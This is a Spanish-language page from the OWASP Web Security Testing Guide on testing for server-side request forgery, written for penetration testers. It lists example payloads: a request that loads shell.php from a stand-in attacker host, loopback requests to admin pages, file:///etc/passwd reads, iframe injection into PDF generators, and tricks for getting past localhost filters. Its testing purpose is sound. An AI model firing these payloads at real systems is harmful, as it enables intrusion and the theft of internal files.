# Falsificación de solicitudes del lado del servidor

|ID          |
|------------|
|WSTG-INJT-19|

## Resumen

Las aplicaciones web suelen interactuar con recursos internos o externos. Aunque se puede esperar que solo el recurso previsto maneje los datos enviados, el manejo inadecuado de esos datos puede crear una situación en la que sean posibles los ataques de inyección. Un tipo de ataque de inyección se denomina falsificación de solicitudes del lado del servidor (SSRF). Un ataque SSRF exitoso puede otorgar al atacante acceso a acciones restringidas, servicios internos o archivos internos de la aplicación o la organización. En algunos casos, incluso puede conducir a la ejecución remota de código (RCE).

## Objetivos de la prueba

- Identificar puntos de inyección SSRF.
- Probar si los puntos de inyección son explotables.
- Evaluar la gravedad de la vulnerabilidad.

## Cómo probar

Al probar SSRF, se intenta hacer que el servidor objetivo cargue o guarde inadvertidamente contenido que podría ser malicioso. La prueba más habitual consiste en probar la inclusión de archivos locales y remotos. La SSRF también tiene otra faceta: una relación de confianza que suele surgir cuando el servidor de la aplicación puede interactuar con otros sistemas de back-end a los que los usuarios no pueden acceder directamente. Estos sistemas de back-end suelen tener direcciones IP privadas no enrutables o estar restringidos a determinados hosts. Como están protegidos por la topología de red, a menudo carecen de controles más sofisticados. Estos sistemas internos suelen contener datos o funcionalidades sensibles.

Considere la siguiente solicitud:

``` http
GET https://example.com/page?page=about.php
```

Puede probar esta solicitud con los siguientes payloads.

### Cargar el contenido de un archivo

```http
GET https://example.com/page?page=https://malicioussite.com/shell.php
```

### Acceder a una página restringida

```http
GET https://example.com/page?page=http://localhost/admin
```

O:

```http
GET https://example.com/page?page=http://127.0.0.1/admin
```

Use la interfaz de loopback para acceder a contenido restringido al host. Este mecanismo implica que, si tiene acceso al host, también tiene privilegios para acceder directamente a la página `admin`.

Este tipo de relaciones de confianza, en las que las solicitudes originadas en la máquina local se manejan de manera diferente a las solicitudes ordinarias, suelen ser lo que permite que la SSRF sea una vulnerabilidad crítica.

### Obtener un archivo local

```http
GET https://example.com/page?page=file:///etc/passwd
```

### Métodos HTTP utilizados

Todos los payloads anteriores se pueden aplicar a cualquier tipo de solicitud HTTP y también se pueden inyectar en valores de encabezados y cookies.

Un aspecto importante de la SSRF con solicitudes POST es que también puede manifestarse de forma ciega, ya que es posible que la aplicación no devuelva nada inmediatamente. En su lugar, los datos inyectados pueden utilizarse en otras funciones, como informes PDF o el procesamiento de facturas u órdenes, entre otras, que pueden ser visibles para empleados o miembros del personal, pero no necesariamente para el usuario final o el evaluador.

Puede encontrar más información sobre la SSRF ciega [aquí](https://portswigger.net/web-security/ssrf/blind) o en la [sección de referencias](#references).

### Generadores de PDF

En algunos casos, un servidor puede convertir los archivos cargados al formato PDF. Intente inyectar elementos `<iframe>`, `<img>`, `<base>` o `<script>`, o funciones CSS `url()` que apunten a servicios internos.

```html
<iframe src="file:///etc/passwd" width="400" height="400">
<iframe src="file:///c:/windows/win.ini" width="400" height="400">
```

### Evasión de filtros comunes

Algunas aplicaciones bloquean las referencias a `localhost` y `127.0.0.1`. Esto se puede eludir mediante:

- El uso de representaciones alternativas de IP que se evalúan como `127.0.0.1`:
    - Notación decimal: `2130706433`
    - Notación octal: `017700000001`
    - Acortamiento de IP: `127.1`
    - Direcciones IP alternativas tratadas como loopback: `127.0.0.2`
- Ofuscación de cadenas
- La creación de un registro DNS público en un dominio propio que resuelva a `127.0.0.1`

A veces, la aplicación permite entradas que coinciden con una expresión determinada, como un dominio. Esto se puede eludir si el analizador del esquema de URL no está implementado correctamente, lo que puede dar lugar a ataques similares a los [ataques semánticos](https://tools.ietf.org/html/rfc3986#section-7.6).

- El uso del carácter `@` para separar la información del usuario del host: `https://expected-domain@attacker-domain`
- La fragmentación de URL con el carácter `#`: `https://attacker-domain#expected-domain`
- Codificación de URL
- Fuzzing
- Combinaciones de todo lo anterior

Para obtener payloads y técnicas de evasión adicionales, consulte la [sección de referencias](#references).

## Remediación

La SSRF se considera uno de los ataques más difíciles de impedir sin utilizar listas de permitidos que especifiquen las IP y URL autorizadas. Para obtener más información sobre la prevención de SSRF, lea la [Hoja de referencia para la prevención de la falsificación de solicitudes del lado del servidor](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).

## Referencias

- [swisskyrepo: SSRF Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [Reading Internal Files Using SSRF Vulnerability](https://medium.com/@neerajedwards/reading-internal-files-using-ssrf-vulnerability-703c5706eefb)
- [Abusing the AWS Metadata Service Using SSRF Vulnerabilities](https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/)
- [OWASP Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Portswigger: SSRF](https://portswigger.net/web-security/ssrf)
- [Portswigger: Blind SSRF](https://portswigger.net/web-security/ssrf/blind)
- [Bugcrowd Webinar: SSRF](https://www.bugcrowd.com/resources/levelup/server-side-forgery-request/)
- [Hackerone Blog: SSRF](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF)
- [Hacker101: SSRF](https://www.hacker101.com/sessions/ssrf.html)
- [URI Generic Syntax](https://tools.ietf.org/html/rfc3986)